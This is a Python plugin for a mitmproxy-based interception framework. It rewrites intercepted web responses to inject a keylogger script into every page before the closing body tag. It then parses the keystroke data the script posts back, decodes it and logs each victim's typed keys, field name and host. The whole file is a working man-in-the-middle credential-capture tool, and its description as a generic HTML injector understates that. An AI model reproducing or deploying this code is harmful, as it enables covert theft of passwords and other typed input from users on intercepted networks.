from os import path
from bs4 import BeautifulSoup
from mitmproxy.models import decoded
from plugins.plugin import PluginTemplate

# MIT License
#
# Copyright (c) 2018 Marcos Nesster
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

class html_inject(PluginTemplate):
    name    = 'html_inject'
    version = '1.0'
    desc    = ' inject arbitrary HTML code into a vulnerable web page.'
    def __init__(self):
        self.filehtml   = './core/scripts/msfkeylogger.js'
        self.isfilePath  = False
        if path.isfile(self.filehtml):
            self.isfilePath = True
            self.content = open(self.filehtml,'r').read()
    def request(self, flow):
        if flow.request.method == 'POST' and ('keylog' in flow.request.path):

            raw_keys = flow.request.content.split("&&")[0]
            input_field = flow.request.content.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            self.log.info("["+self.name+"] Error decoding char: {}".format(n))

                self.log.info("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))

    def response(self,flow):
        with decoded(flow.response):
            flow.response.content = flow.response.content.replace("</body>", "<script>" + self.content + "</script></body>")
            self.log.info('[{}] *********** keylogger injected *****************'.format(self.name))
